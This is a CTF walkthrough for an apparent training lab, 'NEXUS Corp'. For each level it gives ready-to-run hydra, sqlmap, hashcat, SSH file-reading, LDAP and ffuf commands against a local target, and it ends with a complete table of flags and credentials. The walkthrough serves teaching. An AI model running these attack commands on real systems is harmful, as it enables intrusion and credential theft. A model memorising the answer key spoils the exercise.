# NEXUS Corp CTF — Walkthrough (concise)

> **SPOILERS.** One-command solution per level. Instructors/developers only.
> "Wordlist needs" lists the exact plaintext that must appear in the dictionary for the exploit to succeed.

---

## Level 1 — Employee Portal (brute-force)

**Flag:** `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}`
**Wordlist needs:** the password `admin` must be present in the file (rockyou.txt already contains it).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET http-post-form \
  "/level/1/login:username=^USER^&password=^PASS^:Login failed"
```

Credentials found: `admin` / `admin`.

---

## Level 2 — HR Database (SQL injection)

**Flag:** `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}`
**Wordlist needs:** none (automated SQLi).

```bash
sqlmap -u "http://TARGET:5000/level/2/search?search=test&format=json" \
  -T ssh_credentials --dump --batch
```

Pulls the hidden `ssh_credentials` table (including the `sysop` MD5 hash for Level 3).

---

## Level 3 — Hash cracking

**Flag:** `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}`
**Hash (sysop, MD5):** `98ae336a33cb54a3d5effde7f32c06c8`
**Wordlist needs:** the literal string `Op3r4t0r!` must be in the dictionary (not in default rockyou.txt; use a custom list).

```bash
echo "98ae336a33cb54a3d5effde7f32c06c8" > hash.txt && \
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show || \
echo "Op3r4t0r!" >> wordlist.txt && hashcat -m 0 hash.txt wordlist.txt
```

Submit `Op3r4t0r!` at `/level/3/verify`.

---

## Level 4 — SSH infiltration (file discovery)

**Flag:** `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}`
**Wordlist needs:** none. Login is `sysop` / `Op3r4t0r!` (from Level 3).

Single command inside the simulated terminal:

```bash
cat /tmp/debug_dump.txt
```

Also needed for Level 5: `cat /etc/nexus/backup.key` (LDAP admin password `Ldap@dm1n_2024`).

---

## Level 5 — LDAP enumeration

**Flag:** `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}`
**Wordlist needs:** none. Credentials from Level 4.

In the `/level/5` form:

- **Bind DN:** `cn=admin,dc=nexuscorp,dc=local`
- **Bind Password:** `Ldap@dm1n_2024`
- **Base DN:** `dc=nexuscorp,dc=local`
- **Filter:** `(objectClass=*)`
- **Attributes:** `*`

Response returns the flag and `vault_svc`'s SHA256 hash.

---

## Level 6 — Vault API fuzzing (ffuf)

**Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`
**Prerequisite hash crack (SHA256 of `V4ult_M4st3r_K3y!`):**
**Wordlist needs for hashcat:** the literal string `V4ult_M4st3r_K3y!` must be in the dictionary (not in default rockyou.txt; use a custom list).

Single script that does both phases and extracts the flag:

```bash
TARGET=http://127.0.0.1:5000
TOKEN='V4ult_M4st3r_K3y!'

curl -s "$TARGET/level/6/api-wordlist.txt" -o api-wordlist.txt && \
ffuf -w api-wordlist.txt -H "X-Vault-Token: $TOKEN" \
  -u "$TARGET/level/6/vault-api/FUZZ" -fc 404 && \
seq 1 95 > nums.txt && \
ffuf -w nums.txt -H "X-Vault-Token: $TOKEN" \
  -u "$TARGET/level/6/vault-api/archives?doc_id=FUZZ" -fs 95 && \
curl -s -H "X-Vault-Token: $TOKEN" \
  "$TARGET/level/6/vault-api/archives?doc_id=73" | grep -oE 'NEXUS\{[^}]+\}'
```

Winning `doc_id` is **73**. The flag is returned inside `Project_Chimera_Financials.pdf`.

---

## All flags

| Level | Flag |
|-------|------|
| 1 | `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}` |
| 2 | `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}` |
| 3 | `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}` |
| 4 | `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}` |
| 5 | `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}` |
| 6 | `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}` |
